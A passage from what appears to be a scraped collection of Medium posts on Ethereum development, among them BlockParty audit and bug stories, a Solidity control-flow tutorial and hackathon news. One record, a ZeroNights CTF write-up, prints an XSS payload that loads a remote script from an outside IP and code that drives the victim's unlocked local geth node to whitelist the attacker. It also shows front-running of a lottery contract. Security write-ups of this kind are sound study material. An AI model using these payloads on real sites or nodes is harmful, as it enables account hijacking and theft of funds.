[Pub] isPaid     - [Pub] payout     - [Ext] payback     - [Ext] cancel     - [Ext] clear     - [Ext] setLimitOfParticipants     - [Ext] changeName     - [Ext] attendThe contract function dependency graph generated by\u00a0solgraphAnother important thing was to write down past vulnerabilities. I wrote down the detail of when, by who and how they were discovered.Next, I copied my contracts and pasted them into various automated smart contract security analysis sites.I\u2019ve tried the following three sites and here were the results.OyenteThe latest solc supported version is 0.4.17 which was quite old hence I could not test at all.Securify.chNo error was reported. This may be because I used the site in the past and fixed the warnings at that time.SmartDeckNo critical errors were reported, but there were lots of useful warnings. The full report is here. I fixed a few warnings but not all of them. For example, this line was marked for \u201cReentrancy\u201d, but I did not think adding an Ethereum address into an array could cause any re-entrancy issues.Discovering a new\u00a0bug.A new bug was reported by a user of Mythril, a security analysis tool for Ethereum smart contracts which I\u2019d only briefly dabbled with.When I ran Mythril (0.18.6 at that time), there were lots of duplicate errors against unrecognised functions (eg: _function_0x05f203d9) which made it hard to point to the exact location of the vulnerabilities (the full output is here), so I went to the mythril gitter channel and asked for feedback on my log.Mythril reported a transaction order dependence issue, but it was decided that the issue does not pose a risk considering the business logic (and this was confirmed by Mythril engineers).==== Transaction order dependence ====Type: WarningContract: UnknownFunction name: withdraw()PC address: 5265A possible transaction order independence vulnerability exists in function withdraw(). The value or direction of the call statement is determined from a tainted storage location--------------------In file: contracts/Conference.sol:142participant.addr.transfer(payoutAmount)--------------------10 days after I posted my self-audit report to the Mythril gitter channel, I was contacted by a user called nemozqqz regarding a typo in one of the functions.\u201cArray index bug in revoke function of GroupAdmin #175\u201dYes, it was clearly a typo! The bug was introduced back in March when I was enhancing the grant feature to allow deleting multiple admins.Looking back, it was a bad commit because I did not write an additional test to cover the feature.Interestingly, the test coverage tool was showing amber at a line below the vulnerable code (line 36), but not at the typo line itself (line 35).Again, this is completely a logical error so none of the tools I tried were able to detect it. One defensive way to code is to avoid using meaningless variables like i and j (as suggested in the comment by vietlq) but I wonder if there are better idioms to make it more static analyzer (or coverage tool) friendly.The bug was fixed in this PR, but ENS Hackathon is currently using BlockParty with this vulnerability as it was discovered after the contract was deployed. This bug is not critical enough to cancel the entire operation but I need to remember the fact that I will have problem revoking the admin role once I grant it to someone.Call for community auditing of BlockPartyAs you just saw, some of the critical bugs tend to be very simple and you don\u2019t need deep knowledge of Solidity nor the internals of the EVM to figure them out. If more people look into the code base, there is a better chance the bugs will get spotted beyond going through these static analysis tools.There are lots of Ethereum related community events (EthBerlin, Web3 summit, DevCon4) and I am keen to host more pre/post/sub events using BlockParty.If you have a basic understanding of Solidity programming, I would appreciate if you could spend thirty minutes going through the code and let me know if you find anything suspicious.The best way to report any bugs will be to contact me privately via gitter channel (I am @makoto ) or twitter (@makoto_inoue)to assess the impact\u00a0, then raise a github issue publicly (this is exactly how nemozqqz escalated. Thank you so much!).Special thanks to Bernhard Mueller\u00a0, Ramesh Nair and Jeff Lau for reviewing this post", "responses": ""}, {"title": "Control Structures in\u00a0Ethereum", "author_name": "Keno Leon", "link": "https://medium.com/@k3no/control-structures-in-ethereum-3f2d4149b84a?source=search_post", "post_date": "Dec 28, 2017", "readtime": "7 min read", "upvotes": "72", "content": "Control Structures in\u00a0EthereumKeno LeonBlockedUnblockFollowFollowingDec 28, 2017Listen, I love Ethereum, I think it\u2019s cool as hell, I even wrote a book about it, what I really don\u2019t like is the documentation ( that\u2019s why I wrote the book \ud83e\udd14\u00a0?) for instance here\u2019s all the documentation on control structures:Most of the control structures from JavaScript are available in Solidity except for switch and goto. So there is: if, else, while, do, for, break, continue, return, ? :, with the usual semantics known from C or JavaScript.I get it, most programmers don\u2019t want to be told what a for loop is for the 200th time in their career, but I side on those that do want to see a minimal example on all these control structures, so here we are, let\u2019s go one by one.if else\u00a0:The hardest working control statement in the business if serves a conditional and can be used in contracts like so:pragma solidity ^0.4.0;contract Conditional { uint refVal = 10; function isGreaterEqual(uint testVal) view public returns( bool ){     if(testVal >= refVal){        return true;     }   } }// isGreaterEqual(9)... false// isGreaterEqual(10)... true// isGreaterEqual(11)... trueyou are more likely to encounter multiple conditions concatenated like so:pragma solidity ^ 0.4.0;contract Conditional {uint refVal = 10;uint limit = 20;function isGreaterEqualUnderLimit(uint testVal) view public returns(bool) {    if (testVal >= refVal         && testVal < limit) {      return true;    }  }}//isGreaterEqualUnderLimit(9)... false//isGreaterEqualUnderLimit(10)... true//isGreaterEqualUnderLimit(11)... true//isGreaterEqualUnderLimit(20)... falseThe compiler ( I am using remix to test these contracts ) seems to return false umprompted, but smart contracts I think need to be explicit and verbose to avoid any potential bugs or misunderstandings, so using else might be a better pattern:pragma solidity ^ 0.4.0;contract Conditional {uint lower = 10;uint upper = 20;function inBetween(uint testVal) view public returns(bool) {    if (testVal > lower         && testVal < upper) {      return true;    } else {      return false;    }  }}//inBetween(9)... false//inBetween(10)... false//inBetween(11)... true//inBetween(19)... true//inBetween(20)... false//inBetween(21)... falseWhile:While loops are powerful things but could also break your contract, let\u2019s start with a seemingly innocent loop:pragma solidity ^ 0.4.0;contract Loops {uint public testVal = 6;function decrementer() public {        while (testVal >= 4 ){            testVal --;        }    }}// Running the example:// testVal : 6// decrementer()... testVal-- runs 3 times...// testVal : 3The main issue with while loops in Solidity is the use of gas, in the above example ( testVal- -) which decrements by one testVal runs 3 times, and each time it runs it consumes and adds a bit of gas to the transaction, you can see how a while loop that goes over 100\u2019s or thousands of fields could run out of gas, so they are discouraged, I would limit it\u2019s use to small iterators.ForFor loops are usually an alternative to while loops and handy for repetitive operations, the ubiquitous\u00a0: for (i = 0; i < 100\u00a0; i++) { //repeat stuff 100 times } for instance.Here\u2019s an example in solidity:pragma solidity ^ 0.4.0;contract Loops {     uint public testVal = 0;    uint[] testArray;    function iterator() public {    for (uint i=0; i < 4; i++){        testVal++;        testArray.push(i);     }  }function getArray() view public returns(uint[]) {       return testArray; }}After running iterator():// testval: 4// getArray(): [0,1,2,3]Like while loops, these are gas intensive methods; how much\u00a0? the above loop costs~ 139,276 wei when i<100 it runs out of the allotted 300,000 wei\u00a0, just keep it in mind.BreakA break allows you to exit a loop at some point, usually when a condition is met and then execute the next set of instructions in a function\u2026pragma solidity ^ 0.4.0;contract Loops {uint public testVal = 0;function accumulator() public {    while (testVal >= 0) {      testVal++;      if (testVal == 4) {        break;      }    }    testVal = testVal + 6;  }}// After running accumulator()...// testval : 10Notice where the next instruction appears after the break; if you were using a defined variable in a for loop you would place the next statement closer and completely change the outcome, for instance:pragma solidity ^ 0.4.0;contract Loops {uint public testVal = 0;function innerAccumulator() public {    for (uint i = 0; i < 5; i++) {      if (i == 4) {        break;      }      testVal = testVal + i;    }  }}// After running innerAccumulator()...// testVal : 6 let's go step by step to understand it:// when.. // i: 0... testVal = (0 + 0) = 0// i: 1... testVal = (0 + 1) = 1 // i: 2... testVal = (1 + 2) = 3// i: 3... testVal = (3 + 3) = 6// i: 4... since i == 4, testVal remains the same ( 6 ) and the addition doesn't get to execute.If you have any doubts or weird readouts, I recommend you run your loops line by line like we just did to figure out the correct behavior.ContinueA close relative of break, continue jumps out of the loop and has a nuanced different behavior depending on the loop:In a while loop, it jumps back to the condition.In a for loop, it jumps to the update expression.Don\u2019t worry, it makes slightly more sense in example form:pragma solidity ^ 0.4.0;contract Loops {uint public testVal = 0;function skipValue() public {    uint counter = 0;    while (counter < 6) {        counter++;        if(counter == 4)        continue;        testVal++;    }  } }// After running skipValue()...// testVal : 5let's go step by step :// when.. // counter: 0... testVal = (0 + 1) = 1// counter: 1... testVal = (1 + 1) = 2// counter: 2... testVal = (2 + 1) = 3// counter: 3... testVal = (3 + 1) = 4// counter: 4... Here the if statement kicks in and goes back to the while loop, no addition is made, but the process continues.// counter: 5... testVal = (4 + 1) = 5 Our final value. It is important to note where the counter is placed, if placed under the if conditional you got yourself an infinite loop !Now let\u2019s check it\u2019s use in for loops:pragma solidity ^ 0.4 .0;contract Loops {  uint public testVal = 0;function skipValue() public {    for (uint i = 0; i < 5; i++) {      if (i == 2) {        continue;      }      testVal = testVal + i;    }  }}// after running skipValue()...// testVal: 8// step by step// when.. // i: 0... testVal = (0 + 0) = 0// i: 1... testVal = (0 + 1) = 1// the condition i++ is evaluated and the conditional is true, so the loop starts again... // i: 3... testVal = (1 + 3) = 4// i: 4... testVal = (4 + 4) = 8Without the continue it would run like this:// i: 0... testVal = (0 + 0) = 0// i: 1... testVal = (0 + 1) = 1// i: 2... testVal = (1 + 2) = 3// i: 3... testVal = (3 + 3) = 6// i: 4... testVal = (6 + 4) = 10As seen, both have roughly the same effect of skipping a condition, but knowing how they behave in detail is important to avoid bugs.ReturnA return statement simply stops the function execution and returns a value or not, used as a control structure you could use it like so:pragma solidity ^ 0.4.0;contract ReturnContract {  uint public testVal = 0;function returner() public {    testVal = 1;    return;    testVal = 2; // <- this won't happen  }}// After running returner..// testVal: 1// the second testVal assignment doesn't get to execute.more often than not, you will see it used along with a returned value.pragma solidity ^ 0.4.0;contract ReturnContract {function returner() public pure returns(uint) {    uint testVal = 1;    testVal = testVal + 3;    return testVal;    testVal = 8; // <- This will never execute.  }}// Calling returner(): 4// Not only does return gives you back a value, everything after the return does get to execute.Notice we need to provide both the keyword returns and the type returned uint\u00a0, you can also specify a name returns(uint testVala)Ternary OperatorNot to be confused with labels\u00a0: which I belive don\u2019t exists in solidity, you can think of it as a shorthand if else:in the following form: condition\u00a0? expr1\u00a0: expr2\u00a0, it is super useful and greatly in use, here\u2019s a few common uses starting with a common conditional:pragma solidity ^ 0.4.0;contract Ternary {  uint public outputVal = 0;  function testVal(uint inputVal) public {    inputVal < 10 ? outputVal = 1 : outputVal = 2;  }}// in other words, if inputVal is less than 10, outputVal is 1, else it is 2...// testVal(3)... outputVal: 1// testVal(11)... outputVal: 2You can also use it with return:pragma solidity ^ 0.4.0;contract Ternary {  function testVal(uint inputVal) public pure returns(uint) {    return inputVal < 10 ? 1 : 2;  }}//testVal(5): 1//testVal(11): 2And assign variables\u00a0:pragma solidity ^ 0.4.0;contract Ternary {  function testVal(uint inputVal)public pure returns (uint){    uint innerVal = inputVal < 10 ? 1 : 8;    return innerVal + 2;  }}// testVal(7) : 3   // testVal(12) : 10And that\u2019s it, I could probably go on about conditionals all day, but this will hopefully be enough to give you an overview of how to use them in your contracts and expand on the documentation.Thanks for reading\u00a0!KenoShameless plug: If you are looking for an introduction to Ethereum, Solidity and Smart Contracts I just published an eBook and print Book on getting started:https://www.amazon.com/dp/B078CQ8L7VAbout the Author\u00a0:Born Eugenio Noyola Leon (Keno) I am a Designer,Web Developer/programmer, Artist and Inventor, currently living in Mexico City, you can find me at www.k3no.com", "responses": ""}, {"title": "The smart contracts powering blockimmo", "author_name": "Michael Dietz", "link": "https://medium.com/blockimmo/the-smart-contracts-powering-blockimmo-fc16e1bbee09?source=search_post", "post_date": "Apr 13, 2018", "readtime": "7 min read", "upvotes": "23", "content": "The smart contracts powering blockimmoMichael DietzBlockedUnblockFollowFollowingApr 13, 2018blockimmo is a secure, simple platform for buying, selling, and investing in Swiss \ud83c\udde8\ud83c\udded real-estate. By migrating specific components of the Swiss real-estate market on-chain (the Ethereum blockchain), and integrating seamlessly with the existing processes and systems powering this industry, blockimmo aims to facilitate a more accessible, streamlined market.What You Need to Know About The Swiss Real Estate Market 2017/2018The Swiss Real Estate Market is an interesting one.medium.comThe types of listings on blockimmoblockimmo\u2019s primary use-case is the sale of commercial investment properties and the financing of development projects. These properties are usually owned by multiple parties (investors) in differing stakes (shares). A blockchain-based solution introduces the following \ud83d\udd11 benefits:\u2705 Property ownership can occur in small\u00a0stakesA few hundred dollars is all you need to start investing in real-estate.\u2705 Investments are\u00a0liquidProperty can be bought and sold on the scale of minutes.\u2705 Fees are reduced by an order of magnitudeFees are one of the most important determinants of investment performance.\u2705 Accessible to the general\u00a0investorPrime investments no longer happen behind closed doors in small groups of big-shot investors, and sellers have access to a much larger audience.", "responses": "1"}, {"title": "Performance tuning smart contracts for fun and profit (with some\u00a0horror).", "author_name": "makoto_inoue", "link": "https://medium.com/noblocknoparty/performance-tuning-smart-contracts-for-fun-and-profit-with-some-horror-9305c446919c?source=search_post", "post_date": "Sep 18, 2017", "readtime": "6 min read", "upvotes": "8", "content": "Performance tuning smart contracts for fun and profit (with some\u00a0horror).makoto_inoueBlockedUnblockFollowFollowingSep 18, 2017At CodeUp22 where Simply Business sponsored beers and\u00a0pizzasIntroductionIn this blog post, I will share my experience of doing some performance tuning on existing smart contract and its associated security risks of doing so.This is a technical blog post and I assume that readers have some understanding of Solidity, a programming language to write smart contracts on Ethereum.Stories so\u00a0far(You can skip this part if you already know BlockParty)I have been working on an event management DApp (Distributed App) called \u201cBlockParty\u201d. You pay a small deposit when you register. You lose your deposit if you do not turn up. You will get your deposit back + we split the deposit of whom did not turn up. Simple! I\u2019ve been using the dapp on the mainnet (with real ether at stake) since DevCon2 to host small parties (we used to put ETH1 per person as a deposit!).Back in June, while Ether price was going wild with various famous ICOs, I piloted to use BlockParty to manage a monthly Ethereum coding group I organise called \u201cLondon Ethereum Codeup\u201d and wrote a blog post called \u201cRunning everyday dapp when Ethereum is under pressure\u201d.Solving scalability issuesWith the success of piloting a meetup, now it\u2019s time to change gears.My goals for this time was to actually use BlockParty as a main registration tool for CodeUp as well as piloting at London Ethereum Meetup.The first problem I wanted to tackle was a scalability issue. When you write normal web app, that\u2019s one of YAGNI(You aren\u2019t gonna need it) until you have millions of users. That\u2019s not the same when writing smart contract as every operation costs Ether in the form of \u201cgas\u201d.Since Ether price went up x30 for the last 6 month, I became very cost conscious and started monitoring the gas usage with a script and I\u2019ve been aware that the cost for the contract owner to execute payback function (which determines the final payback cost and allows users to withdraw their payout) has a linear gas increase.Gas estimate of payback function depending on the number of participantsAs you can see, the cost of payback increases roughly $0.03 per user. This leads to nearly $3 for hosting over 200 participants event. You may think it's not that expensive but high gas cost has another implication.The gas cost at 200 participants was about 4.5 million. This was the almost close to the upper limit of GasLimit back in June. Even though the gas limit is now increased to 6.7 million, this means that you cannot execute payback function of an event more than around 300 people.Average gasLimit chart from etherscanIf you cannot run the function, it gets to the situation that no one can withdraw their deposit (unless I call selfdestruct function and payback to each participant manually).So this is the fix I made.As you can see, payback and cancel function both iterate through each participant and set their payback amount. The change is to have a global payback value payoutAmount as we know that everybody either receives the same amount (or not at all if you do not attend).When you withdraw, it sends the amount specified at a global variablepayoutAmount instead of paticipant.payout which is set per each participant, but it was actually same across everybody.With this relatively simple change, the gas growth was changed from linear to constant.Saving few more\u00a0gases.Just about the time I started on tackling the scalability issues, I started reading @hayeah\u2019s Diving into The Ethereum VMseries.I had a basic idea of how Ethereum VM works but didn\u2019t know enough to reflect into my solidity coding. It\u2019s surprising to see that some basic stuff like not setting zero variable can actually save a few gas cost.This is the overall result of my performance tuning work.PR for performance optimisation.The biggest improvement was payback function but most function also saved a few cents which made me very happy.Then the horror\u00a0begins\u2026I used the contract to host not only CodeUp (I will write another blog post about how it went on) but also to pilot at Ethereum London meetup which is one of the biggest Ethereum meetups on earth.I did a quick demo on stage about how things work and the response seemed positive. A couple of friends talked to me afterword at pub saying that we should use BlockParty to host half of the capacity (130). The highest number of people registered so far was 13 so it\u2019s almost 10x capacity with ETH 6.5 at steak. That sounds a bit too risky for me so I suggested them to have a look into codes for pair review and they said they will.And the following day\u2026.Bug report on github\u00a0issuesThis was the first bug on my smart contract that anyone, whether they have registered the event or not, could drain money (yes I had some minor ones before).Fortunately this could be exploited only if I decided to cancel the event and let all participants to withdraw their deposit equally.So how did this happen? Let\u2019s go back to the change I made during the performance optimisation.Prior to the change, I was sending amount paticipant.payout so that non registered people could not receive anything. Now I changed to payoutAmount so that even non participants could receive the same amount. In the normal payout situation, it would not have reached at this point except it's canceled which allow anyone to send deposit to themselves multiple times, allowing them to drain the entire deposit.The change I made was relatively easy.PR to fix the\u00a0bugI made sure to check that participant address and sender address matches. I also send to participant.addr instead of msg.sender. Though I did not do any emergency upgrade(and to be honest there\u2019s no emergency upgrade in my contracts) now that the meetups were over and the majority of deposits were withdrawn so there were less likely that people could have lost any deposits. Phew..ConclusionEvery change on smart contract may inject new security vulnerabilities. Are there any ways to increase more external pair of eyes to spot any flows for each release? When I first hosted BlockParty, I actually created a security bounty smart contract and put 1ETH but that has never claimed. It may probably because 1ETH was too small to get enough attention of security researchers and still not a lot compared to bug bounties set on other crowdsale contracts.I\u2019ve been thinking about some sort of smart contract developer mutuals where each developer audit each other\u2019s code and verify it by betting some sort of assurance. If you are interested in the idea, please join the reddit discussion below.Reddit: Any interests for smart contract developer mutual?", "responses": ""}, {"title": "Hedera18 Hackathon London\u200a\u2014\u200aa Winners\u2019\u00a0story", "author_name": "BeMyApp", "link": "https://medium.com/@bemyapp/hedera18-hackathon-london-a-winners-story-7673c83520c7?source=search_post", "post_date": "Oct 18, 2018", "readtime": "7 min read", "upvotes": "78", "content": "Hedera18 Hackathon London\u200a\u2014\u200aa Winners\u2019\u00a0storyBeMyAppBlockedUnblockFollowFollowingOct 18, 2018The Hedera18 Hackathon Mon 15th - Tues 16th October was organised in 8 host cities around the world including: Singapore, Bangalore, Moscow, Tel Aviv, Paris, London, Dallas and San Francisco! The challenge? To develop innovative DApps that take advantage of Hedera\u2019s differentiated micro-payment feature.The Hedera Hashgraph platform has fast latency, is low-cost and so secure, it\u2019s achieved Asynchronous Byzantine Fault Tolerance (aBFT) \ud83d\ude0e. Dallas hosted the inaugural Hedera18 Developer Conference to share insights into the platform, founded by Dr Leemon Baird and Mance Hamon, to be launched this December.LondonPeople from all over Europe registered for the London hackathon to face the challenge of creating disruptive dApps for the upcoming launch of the Hedera blockchain MainNet in December! With 14 teams registered, whittled down to 9 pitching teams, 3 local winners, and one global champion\u2014 this was an incredible event!DAY ONEOn Monday morning, October 15th in London, Solidity developers, blockchain engineers, java developers, decentralised experts and eager innovators piled into the Wallacespace Spitalfields in East London to start the Hedera18 Hackathon.Alex Godwin, Director of Business Development Hedera Hashgraph EMEAAlex Godwin from Hedera Hashgraph launched the event explaining the challenge and criteria that the dApps would be judge by: Feasibility, Innovation, Challenge Fit, and Technical Execution.Listening carefully to the event introduction and challenge details12 Individuals pitched their ideas to recruit participants to their teams, or presented their initial idea to stake claim to their project. The ideas diverse: from a crowdsourced ideas bounty platform, Surveys, Music copyright, Crowdsourcing presence app, and many more\u2026Soon projects sprung up out of nowhere and 14 teams registered their ideas to create dApps over the next two days.Teams got straight to the task and worked hard to plan the dApp and get onto the Hedera Platform TestNet!Some teams were pre-formed, but the majority had just met this morning over breakfast and were embarking on a new hackathon adventure ready to win the prize for best dApp.PRIZESThe teams were all working to learn new tech, get to grips with the hedera platform before launch and contribute to the robustness of the tech, collaborate on cool projects, meet new people, but also\u200a\u2014\u200ato win the local and global prize!Each city were battling to gain the 1st place prize of $10K, 2nd place 7K and 3rd place of 3K of which would be made up of Hedera tokens and cash\u00a0;) The 3 winners from each city would compete to be chosen as Global Hedera18 Hackathon winner and claim the 50K bounty!Teams hard at working developing their original\u00a0dApps!JUDGESThe London judges to select the local winners included 3 blockchain experts: Helen Disney, founder of Unblocked which helps clarify all the topics of blockchain across industries, and helps demistify the legal, financial and regulation aspects; Alex Godwin Director of Business Development EMEA from Hedera Hashgraph; and Shiv Aggarwal, CEO of MyEarth.id, the decentralised ID management system.London\u2019s Local Judges\u200a\u2014\u200aHedera 18 HackathonPITCH TRAININGThe teams were given a workshop on demo pitching to ensure a super slick presentation and video demo. Teams worked relentlessly to ensure they were able to produce an MVP of a dApp along with a video demo to showcase the features of their product. Not everyone was used to pitching so the tips came in very useful!End of the Day ONE and some hackers continued throughout the night to complete their challenges.Fortunately, there were some comfy sofas to grab some Zzzzs and showers to freshen up at the amazing venue Wallacespace Spitalfields venue!", "responses": ""}, {"title": "ZeroNights ICO Hacking Contest\u00a0Writeup", "author_name": "Arseny Reutov", "link": "https://blog.positive.com/zeronights-ico-hacking-contest-writeup-63afb996f1e3?source=search_post", "post_date": "Nov 15, 2017", "readtime": "5 min read", "upvotes": "18", "content": "ZeroNights ICO Hacking Contest\u00a0WriteupArseny ReutovBlockedUnblockFollowFollowingNov 15, 2017Prior to ZeroNights security conference, an ICO hacking contest had been announced. The first three contestants to solve the tasks could win invites to the conference. My motivation to participate in the contest was driven by the interest in smart contract security which is gaining popularity in various CTFs nowadays.The ICO website was a dApp that interacted with two contracts on Rinkeby testnet via web3.js. The first contract was an ERC20 token for HACK coins so you could see your balance, number of sold coins, total supply, etc. The ultimate goal of the contest was to get more than 31337 HACK coins.The other contract was a lottery game, here is a relevant fragment from it:   function spinLottery(uint number) public {        if (msg.sender != robotAddress) {            playerNumber[msg.sender] = number;            players.push(msg.sender);            NewLotteryBet(msg.sender);        } else {            require(block.number - lotteryBlock > 5);            lotteryBlock = block.number;for (uint i = 0; i < players.length; i++) {                if (playerNumber[players[i]] == number) {                    desires[players[i]].active = true;                    desires[players[i]].email = \"*Use changeEmail func to set your email.*\";                    Proposal(players[i], desires[players[i]].email);                }            }            delete players; // flushing round            NewLotteryRound(lotteryBlock);        }    }If you are lucky enough to guess the number your address will be added to the \u201cdesires\u201d mapping. There was a whitepaper like in a real ICO which said that one should be manually whitelisted by the token owner to be able to buy tokens or you could try to win the lottery. Let\u2019s try to beat it!Winning the\u00a0lotteryLooking at the code above you see that there is a robot that posts random numbers once in 5 blocks. These numbers are submitted in clear text, no seed is used. It means that this code is prone to Transaction Ordering Dependence or Frontrunning. In other words, if we are quick enough to look up the number submitted by the robot and issue our own transaction with this number so that both transaction appear in the same block, we can win the lottery provided that our transaction is executed before robot\u2019s one. How can we achieve this? Very easy, we just need to increase gas price so that it is higher than in the robot\u2019s transaction. After several attempts I managed to fit into the same block with the robot.So, I got in the \u201cdesires\u201d mapping, but I still could not buy tokens. To do so, my address has to be moved from \u201cdesires\u201d to the \u201cwhitelist\u201d mapping. From the code it is evident that only contract owner is able to do that:   function addParticipant(address who) onlyController public {        if (isDesirous(who) && who != controller) {            whitelist[who] = true;            delete desires[who];            AddParticipant(who);            RemoveProposal(who);        }    }Getting to the whitelistThe smart contract didn\u2019t contain any flaws that could promote me to the whitelist. However, the web application written in Vue.js had the following code that displayed user\u2019s email address:domProps: {  innerHTML: t._s(e.email)}It means that user controlled input was reflected on the page without sanitization, or simply put\u200a\u2014\u200awe had an XSS. Using `changeEmail` method I got some HTML markup injected onto the page.This is where it gets interesting: what if the contract owner visits this page in his browser? If it happens, we can try to send a transaction via local geth node usually listening on localhost:8545 that will add us to the whitelist on behalf of the contract owner provided that his account is unlocked. Looked unlikely, but it was worth a try. Shortly after, I came up with the following JS code:var web3 = new Web3(new Web3.providers.HttpProvider(\"http://localhost:8545\"));var abi = /* CONTRACT ABI HERE */[];web3.eth.defaultAccount = web3.eth.accounts[0];var c = web3.eth.contract(abi).at(\"0xd80cc3550da18313af09fbd35571084913cd5246\");c.addParticipant(\"0x949db1e44B7762683d1Cf947D2B3c2358bD7434A\", function(a,b){console.log(b)});Having uploaded it to my box, I sent changeEmail tx once again with the following code instead of my email address:<img src=x onerror='var a=document.createElement(\"script\");a.src=\"http://52.207.112.238/test.js\";document.body.append(a);'>To my surprise, the contract owner indeed was visiting the site and he had a geth node running on localhost. The code worked well and shortly after I saw myself in the whitelist.Buying tokensAt that point nothing could stop me from buying 31337 tokens. Except the following require() statement in buy() method:require(hack.balanceOf(msg.sender) + hacks <= 1000 ether);It meant that I could not own more than 1000 HACK coins. But what if we just transfer these 1000 tokens to some other our address and then buy again? Let\u2019s look at transfer method:function transfer(address _to, uint256 _value) public afterICO returns (bool) {/* ... */}It has afterICO modifier which should stop us from transferring the funds. However, it was ineffective since the condition was not used in require():modifier afterICO() {    block.timestamp > November15_2017; _;}After making 32 \u201cbuy & transfer\u201d transactions I got the desired balance:It actually needed +1 HACK, otherwise the checker script would\u00a0fail.Crafting an off-chain transactionThe final task which seemed really easy at first sight was to issue a signed off-chain transaction that contained \u201cHACK\u201d in msg.data. The key word here is a \u201ctransaction\u201d. I spent a couple of hours hopelessly trying to make checker script validate a signed message as in the Ethernaut CTF until I realized that a signed off-chain transaction was needed.There are no easy ways to do it via web3, but luckily a project called ethereumjs-tx seemed to be the right tool.Transactions in Ethereum are signed with sender\u2019s private key, so we have to extract it from MetaMask first. After numerous attempts to build different tx structures which were all rejected by the checker script I finally came up with the following one:var Transaction = require('../index.js')var tx = new Transaction(null, 1)var privateKey = new Buffer('cafebabe', 'hex')var rawTx = {  nonce: '0x00',  gasPrice: '0x09184e72a000',  gasLimit: '0x2710',  to: '0x9993ae26affd099e13124d8b98556e3215214e81',  value: '0x00',  data: '0x4841434b' // HACK}var tx = new Transaction(rawTx)tx.sign(privateKey)var serializedTx = tx.serialize()console.log(serializedTx.toString('hex'))After submitting the result I finally got the flag which granted me second place.", "responses": "1"}, {"title": "State Channels for Babies Pt.\u00a01", "author_name": "BlockChannel", "link": "https://medium.com/blockchannel/state-channels-for-babies-pt-1-a8a31c78e49c?source=search_post", "post_date": "Jul 26, 2018", "readtime": "3 min read", "upvotes": "78", "content": "State Channels for Babies Pt.\u00a01Helping Blockchains Take Their First\u00a0StepsBlockChannelBlockedUnblockFollowFollowingJul 26, 2018Cross-Post: This post was originally written by Hunter Hillman, and was republished from the Connext blog with their explicit permission.Baby Learns to Walk (&\u00a0Scale)After our introduction to blockchains, Blockchains for Babies, we\u2019re proud to present the next installment in the series! There are many developers working very hard on scaling solutions that are essential for the mainstream adoption of blockchain-based technologies. But a lot of terms get thrown around\u200a\u2014\u200aSharding, Plasma, State Channels, Sidechains\u200a\u2014\u200abut what does it all mean?In this installment, we\u2019re going to take a dive into what state channels are and how they can make blockchains more practical for everyone by assisting with scalability. This chapter relies on terms and concepts from the original #blockchainsforbabies story, so if you haven\u2019t read it yet check it out here!Now, without further ado, we\u00a0present:", "responses": ""}, {"title": "Episode 34: Developers Developers Developers, with Zastrin.com", "author_name": "Steven McKie", "link": "https://medium.com/blockchannel/episode-34-developers-developers-developers-with-zastrin-com-d75b00113964?source=search_post", "post_date": "Nov 21, 2017", "readtime": "", "upvotes": "67", "content": "Episode 34: Developers Developers Developers, with Zastrin.comSteven McKieBlockedUnblockFollowFollowingNov 21, 2017Press Play!On this episode of BlockChannel, Mckie and Petty sit down with Mahesh Murthy, CEO and Founder of Zastrin.com. If you\u2019ve ever used Code Academy or Udemy to get up to speed on a technical topic, then you\u2019ll love Zastrin. His platform has been bootstrapped, designed, built, and managed from the ground up, solo dolo. Mahesh is a gift to the Ethereum community; his dedication has created many new novice and intermediate developers, on-boarding them into this exciting new way to build applications that are globally accessible. Come learn how you can join the fun and become an Ethereum developer yourself.Show Links:Zastrin: Zastrin.comPromo: Use code \u201cBlockChannel\u201d to save 50% off all courses.Intro/Outro music \u201cIf You Leave\u201d by Dee Lilly: Deelilly\u200a\u2014\u200aIf-you-leave-ft-quez-xone-whiteShow Sponsor(s):Status Messaging Client: status.imStatus Developer Documentation: wiki.status.im/contributing/deve\u2026ent/introduction/Disclaimer: This is not investment advice, it is an engaged discussion on new technology; BlockChannel reminds you to always do your own due diligence before investing in any crypto-related project in the industry.", "responses": ""}, {"title": "Becoming More Technical and Less Inhibited", "author_name": "James Ryan Moreau", "link": "https://medium.com/@jrmoreau/becoming-more-technical-and-less-inhibited-5b4e78fcfc1e?source=search_post", "post_date": "Jun 18, 2018", "readtime": "4 min read", "upvotes": "178", "content": "Becoming More Technical and Less InhibitedJames Ryan MoreauBlockedUnblockFollowFollowingJun 18, 2018In an effort to share something via writing and other mediums of content, I\u2019m going to open up about the last few months of my life studying coding, considering my career path in the blockchain space and what it\u2019s been like to balance it all with recently becoming a dad. It likely will not be linear in terms of my explanation or reasoning, but bear with me, I\u2019m dealing with.a bad case of writers block and I\u2019m trying to work out the how\u2019s and why\u2019s of self-expression in this new phase of my life and career", "responses": ""}, {"title": "How Lity Makes Programs Safer, a #CVM Mini-Series", "author_name": "Mark Brinkerhoff", "link": "https://medium.com/cybermiles/how-lity-makes-programs-safer-a-cvm-mini-series-f9aca768757?source=search_post", "post_date": "Aug 20, 2018", "readtime": "3 min read", "upvotes": "184", "content": "How Lity Makes Programs Safer, a #CVM Mini-SeriesMark BrinkerhoffBlockedUnblockFollowFollowingAug 20, 2018Lity is set apart by, as previously mentioned in the first of our four-part series, a dynamically-extensible language, a compiler (Lityc), and CyberMiles\u2019 own virtual machine (CVM)\u200a\u2014\u200aall on the CyberMiles blockchain. As a superset of the Solidity language, it is more extensible, performative, and safe. How so?The Library + Ethereum Native Interface (libENI) dynamic virtual machine extension allows native functions to be added to the CVM on the fly, without stopping, forking or upgrading the blockchain.The Lity Rules Engine (coming soon) will allow formal business rules to be embedded in smart contracts, promising to drastically increase developer productivity and to reduce errors.The ERC checker not only checks but also automatically fixes common security bugs in smart contracts.For the purpose of this exercise, let\u2019s dive a little deeper into the security aspects of Lityc and CVM, those which make programs run more safely.Take Advantage of Better SecurityOur team has categorized known security issues with Ethereum Solidity smart contracts, extracted common coding patterns that lead to those issues, and installed checks for those patterns in both the Lity language compiler and CVM. We\u2019ve taken proactive steps to safeguard against 95% of smart contract bugs that lead to money loss on Ethereum\u200a\u2014\u200abugs that are highly unlikely to occur in the first place on the CyberMiles blockchain.Use Lityc to Secure Your ContractUnderstanding the ERC checker and overflow protection is key to making proper use of Lityc.The ERC checker is a Lity compiler facility, which ensures that smart contracts correctly comply to the ERC standards they claim to implement. Notably, in the ERC universe:ERC20 is the most common token/coin issuance contract standard.[Watch our ERC20 checker overview][See the ERC20 checker in action]ERC223 is an enhancement to ERC20. It guards against inadvertent fund transfers to contract addresses, which is a common source of fund loss on Ethereum. (Incidentally, we recommend that all ERC20 contracts on CyberMiles conform to the ERC223 standard for better safety.)[Watch our ERC223 checker overview][See the 